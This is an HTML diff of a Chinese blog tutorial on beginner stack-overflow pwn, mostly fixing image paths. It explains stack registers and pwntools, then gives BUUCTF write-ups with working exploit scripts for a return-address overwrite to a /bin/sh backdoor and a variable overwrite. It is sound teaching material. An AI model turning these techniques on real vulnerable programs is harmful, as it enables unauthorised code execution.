@@ -17,19 +17,19 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="一、前言介绍IDA">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/7.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/3.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/4.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/5.png">
 <meta property="article:published_time" content="2024-07-16T03:49:20.000Z">
-<meta property="article:modified_time" content="2024-09-09T06:46:26.101Z">
+<meta property="article:modified_time" content="2024-09-01T12:00:56.831Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -109,7 +109,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 38
+    			总文章数 39
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -404,9 +404,9 @@
 
 <h4 id="栈寄存器介绍"><a href="#栈寄存器介绍" class="headerlink" title="栈寄存器介绍"></a>栈寄存器介绍</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">EIP</span>：主要用于存放当前代码段即将被执行的下一条指令的偏移，但其本质上并不能直接被指令直接访问。</span><br><span class="line">最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，也就是覆盖<span class="selector-tag">EIP</span></span><br><span class="line"><span class="selector-tag">ESP</span>：栈顶指针，始终指向栈顶</span><br><span class="line"><span class="selector-tag">EBP</span>：栈底指针，通常叫栈基址</span><br></pre></td></tr></table></figure>
 
-<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png"></p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/6.png"></p>
 <p>可以从图片中看出但我们往栈中填充大量数据导致数据发生溢出，将原本存在于缓冲区中的数据抛出栈，而此时栈中存放的就是我们填充的数据，但我们此时输入的数据不是垃圾数据的时候，而是一个shell的时候，我们就可以获取shell，例如下图</p>
-<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/7.png"></p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/7.png"></p>
 <h4 id="python之pwntools"><a href="#python之pwntools" class="headerlink" title="python之pwntools"></a>python之pwntools</h4><p>python的一个模块，使用python3版本安装</p>
 <h5 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">应用题目的程序或对应的<span class="selector-tag">nc</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> = <span class="selector-tag">peocess</span>(<span class="string">&quot;题目附件给的ELF文件&quot;</span>)</span><br><span class="line"><span class="selector-tag">p</span> = <span class="selector-tag">remote</span>(<span class="string">&quot;题目URL&quot;</span>, 端口)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="selector-tag">send</span>(data): 发送数据</span><br><span class="line"><span class="selector-tag">sendline</span>(data): 发送一行数据，相当于在末尾加\<span class="selector-tag">n</span></span><br><span class="line"><span class="selector-tag">eg</span>: <span class="selector-tag">p</span><span class="selector-class">.sendline</span>(b<span class="string">&#x27;a&#x27;</span> * (<span class="number">0</span>x.... + <span class="number">0</span>x....) + <span class="built_in">p64</span>(<span class="number">0</span>x....)) </span><br><span class="line">#将<span class="selector-tag">a</span>填充进去导致栈溢出到<span class="selector-tag">p64</span>对应的位置执行/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>（一般是利用后门）</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">recv</span>(numb=<span class="number">4096</span>, timeout=default): 给出接收的字节数，<span class="selector-tag">timeout</span>指定超时</span><br><span class="line"><span class="selector-tag">recvuntil</span>(delims, drop=False): 接收到<span class="selector-tag">delims</span>的<span class="selector-tag">pattern</span></span><br><span class="line"><span class="selector-tag">eg</span>: <span class="selector-tag">p</span><span class="selector-class">.recvntil</span>(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">#一般是接收跟栈溢出有关的数据</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">recvall</span>(): 接收到<span class="selector-tag">EOF</span></span><br><span class="line"><span class="selector-tag">recvrepeat</span>(timeout=default): 接收到<span class="selector-tag">EOF</span>或<span class="selector-tag">timeout</span></span><br><span class="line"><span class="selector-tag">interactive</span>(): 与<span class="selector-tag">shell</span>交互</span><br><span class="line"><span class="selector-tag">eg</span>:<span class="selector-tag">p</span><span class="selector-class">.interactive</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -431,14 +431,14 @@
 <li>编写EXP</li>
 </ol>
 <h3 id="三、相关题目"><a href="#三、相关题目" class="headerlink" title="三、相关题目"></a>三、相关题目</h3><h4 id="BUUCTF—-BJDCTF-2020-babystack（栈溢出覆盖返回地址）"><a href="#BUUCTF—-BJDCTF-2020-babystack（栈溢出覆盖返回地址）" class="headerlink" title="BUUCTF—-[BJDCTF 2020]babystack（栈溢出覆盖返回地址）"></a>BUUCTF—-[BJDCTF 2020]babystack（栈溢出覆盖返回地址）</h4><p>考点：nbytes，无符号整型，当输入-1时，会变为无符号整型的最大值，栈溢出</p>
-<h5 id="1-checksec查看保护机制"><a href="#1-checksec查看保护机制" class="headerlink" title="1.checksec查看保护机制"></a>1.checksec查看保护机制</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/1.png"></p>
+<h5 id="1-checksec查看保护机制"><a href="#1-checksec查看保护机制" class="headerlink" title="1.checksec查看保护机制"></a>1.checksec查看保护机制</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/1.png"></p>
 <p>发现是amd64且没开保护机制</p>
 <h5 id="2-用IDA64打开"><a href="#2-用IDA64打开" class="headerlink" title="2.用IDA64打开"></a>2.用IDA64打开</h5><p>左边找到main函数F5查看伪代码</p>
-<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/2.png"></p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/2.png"></p>
 <p>栈溢出，这里nbytes是read函数读入的字符数，如果nbytes &lt; 11，那么就无法导致栈溢出，因为栈溢出需要读入的字符大于10，因此发送去填充的第一个数需要大于10.当输入为负数的时候也成功了</p>
 <p>即需要sendline(‘-1’)</p>
 <h5 id="3-获取操作地址到覆盖地址的距离"><a href="#3-获取操作地址到覆盖地址的距离" class="headerlink" title="3.获取操作地址到覆盖地址的距离"></a>3.获取操作地址到覆盖地址的距离</h5><p>双击上图的buf，得到下图</p>
-<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/3.png"></p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/3.png"></p>
 <p>其中可以看到我们操作地址为buf对应得地址0x10,而覆盖地址为r对应得地址0x8</p>
 <p>即EXP中为b’a’ * (0x10 + 0x8)或者通过python计算python(hex(0x10+0x8))</p>
 <h5 id="4-获取后门函数地址"><a href="#4-获取后门函数地址" class="headerlink" title="4.获取后门函数地址"></a>4.获取后门函数地址</h5><p>发现左边main函数上面有个backdoor,点击发现&#x2F;bin&#x2F;sh,即p64(0x4006EA)</p>
@@ -447,7 +447,7 @@
 
 <h5 id="5-构造EXP"><a href="#5-构造EXP" class="headerlink" title="5.构造EXP"></a>5.构造EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载交互对象</span></span><br><span class="line">p = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;, 28880)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>) + p64(<span class="number">0x4006E6</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#向程序发送字符</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将代码交互转换为手工交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h5 id="6-获取flag"><a href="#6-获取flag" class="headerlink" title="6.获取flag"></a>6.获取flag</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/4.png"></p>
+<h5 id="6-获取flag"><a href="#6-获取flag" class="headerlink" title="6.获取flag"></a>6.获取flag</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/4.png"></p>
 <h4 id="BUUCTF—-CISCN-2019华北-PWN1（栈溢出，变量覆盖）"><a href="#BUUCTF—-CISCN-2019华北-PWN1（栈溢出，变量覆盖）" class="headerlink" title="BUUCTF—-[CISCN 2019华北]PWN1（栈溢出，变量覆盖）"></a>BUUCTF—-[CISCN 2019华北]PWN1（栈溢出，变量覆盖）</h4><h5 id="1-checksec查看保护机制-1"><a href="#1-checksec查看保护机制-1" class="headerlink" title="1.checksec查看保护机制"></a>1.checksec查看保护机制</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">checksec</span> <span class="selector-tag">pwn</span></span><br><span class="line"><span class="selector-attr">[*]</span> &#x27;/<span class="selector-tag">root</span>/桌面/<span class="selector-tag">pwn</span>&#x27;</span><br><span class="line">    <span class="selector-tag">Arch</span>:     <span class="selector-tag">amd64-64-little</span></span><br><span class="line">    <span class="selector-tag">RELRO</span>:    <span class="selector-tag">Partial</span> <span class="selector-tag">RELRO</span></span><br><span class="line">    <span class="selector-tag">Stack</span>:    <span class="selector-tag">No</span> <span class="selector-tag">canary</span> <span class="selector-tag">found</span></span><br><span class="line">    <span class="selector-tag">NX</span>:       <span class="selector-tag">NX</span> <span class="selector-tag">enabled</span></span><br><span class="line">    <span class="selector-tag">PIE</span>:      <span class="selector-tag">No</span> <span class="selector-tag">PIE</span> (<span class="number">0</span>x400000)</span><br></pre></td></tr></table></figure>
 
 <p>无保护机制且为amd64</p>
@@ -458,7 +458,7 @@
 <p>即payload1 &#x3D; b’a’ * (0x30 - 0x4) </p>
 <h5 id="4-构造EXP"><a href="#4-构造EXP" class="headerlink" title="4.构造EXP"></a>4.构造EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#由于只需要将v2赋值为11.28125对应得hex形式就能获得flag,就不需要找后门函数了</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载交互对象</span></span><br><span class="line">p = process(<span class="string">&quot;./PWN1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;, 28522)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#向程序发送字符</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将代码交互转换为手工交互</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h5 id="5-获取flag"><a href="#5-获取flag" class="headerlink" title="5.获取flag"></a>5.获取flag</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/5.png"></p>
+<h5 id="5-获取flag"><a href="#5-获取flag" class="headerlink" title="5.获取flag"></a>5.获取flag</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/5.png"></p>
 
 	
 
